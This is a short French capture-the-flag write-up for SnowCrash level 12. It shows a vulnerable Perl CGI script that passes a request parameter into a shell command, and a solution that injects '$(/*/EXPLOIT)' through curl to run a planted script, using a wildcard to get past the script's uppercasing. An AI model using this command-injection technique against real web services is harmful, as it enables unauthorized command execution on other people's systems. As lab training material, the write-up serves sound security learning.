# Level 12

```bash
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

```perl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Pour une injecter une commande on creer un fichier nommer 'exploit' qui appel la fonction 'getflag' et le redirige vers un fichier dans le repertoire '/tmp' puis le passe en argument a la variable a

```bash
level12@SnowCrash:~$ cat /tmp/EXPLOIT
#! /bin/bash

getflag > /tmp/flag
level12@SnowCrash:~$ curl http://localhost:4646?x='$(/*/EXPLOIT)'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : **************
```

Le repertoire du fichier 'EXPLOIT' est donner sous forme de wildcard puisque le script en question remplace tous les caracteres en majuscules incluant le nom du repertoire 'tmp' ce qui fausse le nom du repertoire et empeche la commande de s'executer